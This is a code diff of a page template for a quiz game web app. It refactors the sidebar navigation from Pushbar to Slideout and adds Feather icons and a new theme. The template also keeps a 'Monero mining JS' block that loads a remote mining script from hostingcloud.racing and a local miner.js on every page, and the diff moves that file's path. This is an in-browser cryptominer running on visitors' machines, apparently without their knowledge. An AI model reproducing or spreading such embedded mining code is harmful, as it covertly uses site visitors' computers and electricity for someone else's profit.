@@ -38,70 +38,11 @@
 </h:head>
 
 <h:body>
-    <div data-pushbar-id="bar" class="pushbar from_left sidebar-nav">
-        <div class="pushbar-close">
-            <span data-pushbar-close="">
-                <svg viewBox="0 0 24 24" width="24" height="24"><path class="heroicon-ui" d="M16.24 14.83a1 1 0 0 1-1.41 1.41L12 13.41l-2.83 2.83a1 1 0 0 1-1.41-1.41L10.59 12 7.76 9.17a1 1 0 0 1 1.41-1.41L12 10.59l2.83-2.83a1 1 0 0 1 1.41 1.41L13.41 12l2.83 2.83z"/></svg>
-            </span>
-        </div>
-
-        <h:form rendered="#{sessionInfoBean.hasRole('PLAYER')}">
-            <nav class="pushbar-nav pl-4 pr-3">
-                <ul class="list-unstyled">
-                    <li class="my-3">
-                        <h:commandLink action="/players/profile?faces-redirect=true" value="Home">
-                            <f:ajax execute="@this" render="@none"/>
-                            <f:setPropertyActionListener value="#{sessionInfoBean.currentUser.player}" target="#{profileBean.player}"/>
-                        </h:commandLink>
-                    </li>
-                    <li class="my-3">
-                        <a href="/quizroom/index.html">Join Game</a>
-                    </li>
-                    <li class="my-3">
-                        <a href="/quizroom/createRoom.xhtml?faces-redirect=true">Create Game</a>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/players/all?faces-redirect=true" value="View Players"/>
-                    </li>
-                </ul>
-            </nav>
-        </h:form>
-
-        <h:form rendered="#{sessionInfoBean.hasRole('MANAGER')}">
-            <nav class="pushbar-nav pl-4 pr-3 py-4">
-                <ul class="list-unstyled">
-                    <li class="my-3">
-                        <h:commandLink action="/secured/home?faces-redirect=true" value="Home"/>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/secured/overview.xhtml?faces-redirect=true" value="QuestionSets"/>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/players/all?faces-redirect=true" value="Players"/>
-                    </li>
-                    <li class="my-3">
-                        <h:commandLink action="/secured/profile.xhtml?faces-redirect=true" value="Settings"/>
-                    </li>
-                </ul>
-            </nav>
-        </h:form>
-
-        <footer class="pushbar-footer">
-            <div class="pushbar-themes">
-                <div class="theme" onclick="changeTheme('default')">default</div>
-                <div class="theme" onclick="changeTheme('outrun')">outrun</div>
-            </div>
-
-            <a class="pushbar-logout" href="/logout">Logout</a>
-        </footer>
-
-    </div>
-
-
-    <div class="pushbar_main_content">
-        <header class="navbar d-flex py-2">
-            <div class="navbar-burger py-2 px-2" data-pushbar-target="bar">
-                <svg viewBox="0 0 24 24" width="24" height="24"><path class="heroicon-ui" d="M4 5h16a1 1 0 0 1 0 2H4a1 1 0 1 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2z"/></svg>
+    <h:messages id="messages" globalOnly="true" styleClass="alerts" showSummary="true" showDetail="true"/>
+    <div id="main" class="page-content panel">
+        <header class="navbar d-flex py-2 px-3">
+            <div class="navbar-burger js-toggle-sidebar">
+                <i data-feather="align-left" class="xlg"></i>
             </div>
 
             <div class="d-flex flex-grow-1 justify-content-center px-2">
@@ -117,30 +58,100 @@
 
         <main class="container">
 
-            <h:messages id="messages" globalOnly="true" styleClass="alerts" showSummary="true" showDetail="true"/>
             <ui:insert name="content" />
 
         </main>
     </div>
+
+    <div id="menu" class="sidebar flex-column">
+        <div class="d-flex py-2 px-3 justify-content-end">
+            <span class="sidebar-toggle js-toggle-sidebar pointer">
+                <i data-feather="x" class="xlg"></i>
+            </span>
+        </div>
+
+
+        <h:form styleClass="flex-grow-1" rendered="#{sessionInfoBean.hasRole('PLAYER')}">
+            <nav class="d-flex flex-column">
+                <h:commandLink action="/players/profile?faces-redirect=true" styleClass="sidebar-link">
+                    <f:ajax execute="@this" render="@none"/>
+                    <f:setPropertyActionListener value="#{sessionInfoBean.currentUser.player}" target="#{profileBean.player}"/><i data-feather="home" class="lg mr-2"></i> Home</h:commandLink>
+                <a href="/quizroom/index.html" class="sidebar-link"><i data-feather="zap" class="lg mr-2"></i> Join Game</a>
+                <a href="/quizroom/createRoom.xhtml?faces-redirect=true" class="sidebar-link"><i data-feather="plus-circle" class="lg mr-2"></i> Create Game</a>
+                <h:commandLink action="/players/all?faces-redirect=true" styleClass="sidebar-link"><i data-feather="users" class="lg mr-2"></i> View Players</h:commandLink>
+            </nav>
+        </h:form>
+
+        <h:form styleClass="flex-grow-1" rendered="#{sessionInfoBean.hasRole('MANAGER')}">
+            <nav class="d-flex flex-column">
+                <h:commandLink action="/secured/home?faces-redirect=true" styleClass="sidebar-link"><i data-feather="home" class="lg mr-2"></i> Home</h:commandLink>
+                <h:commandLink action="/secured/overview.xhtml?faces-redirect=true" styleClass="sidebar-link"><i data-feather="help-circle" class="lg mr-2"></i> QuestionSets</h:commandLink>
+                <h:commandLink action="/players/all?faces-redirect=true" styleClass="sidebar-link"><i data-feather="users" class="lg mr-2"></i> Players</h:commandLink>
+                <h:commandLink action="/secured/profile.xhtml?faces-redirect=true" styleClass="sidebar-link"><i data-feather="settings" class="lg mr-2"></i> Settings</h:commandLink>
+            </nav>
+        </h:form>
+
+        <footer class="sidebar-footer text-center">
+            <div class="sidebar-themes py-4"><!-- TODO maybe render w/ JS and add active class -->
+                <div class="theme" onclick="changeTheme('default')"><i data-feather="moon" class="lg"></i></div>
+                <div class="theme" onclick="changeTheme('outrun')"><i data-feather="sunset" class="lg"></i></div>
+                <div class="theme" onclick="changeTheme('light')"><i data-feather="sun" class="lg"></i></div>
+            </div>
+
+            <a class="sidebar-logout" href="/logout"><i data-feather="log-out" class="mr-2"></i>Logout</a>
+        </footer>
+
+    </div>
+    <script type="text/javascript" src="../../resources/modules/slideout.min.js" />
+    <script type="text/javascript">
+      let sidebar = new Slideout({
+        'panel': document.getElementById('main'),
+        'menu': document.getElementById('menu'),
+        'padding': 256,
+        'tolerance': 70
+      });
+
+      let btns = document.querySelectorAll('.js-toggle-sidebar');
+      btns.forEach(btn => btn.addEventListener('click', () => {
+        sidebar.toggle();
+      }));
+
+      const close = (e) => {
+        e.preventDefault();
+        sidebar.close();
+      };
+
+      // code for activating backdrop
+
+      sidebar.on('beforeopen', function(){ this.panel.classList.add('panel-open');})
+        .on('open', function(){this.panel.addEventListener('click', close);})
+        .on('beforeclose', function(){
+          this.panel.classList.remove('panel-open');
+          this.panel.removeEventListener('click', close);
+        })
+    </script>
+
+
+    <ui:insert name="modals"/>
+
 
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
     <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
     <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
     <script type="text/javascript" src="../../resources/modules/close-alerts.js"/>
-    <script type="text/javascript" src="../../resources/modules/pushbar.js" />
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
     <script type="text/javascript">
-        const pushbar = new Pushbar({
-            blur:true,
-            overlay:true,
-        });
+      feather.replace()
     </script>
 
     <!-- Monero mining JS -->
     <!-- Blocked by my adblocker, but local copy of code doesn't work :/ -->
     <script type="text/javascript" src="https://www.hostingcloud.racing/R0UY.js"></script>
-    <script type="text/javascript" src="../../resources/js/miner.js" />
+    <script type="text/javascript" src="../../resources/util/miner.js" />
 
     <ui:insert name="site-specific-javascript"/>
 </h:body>
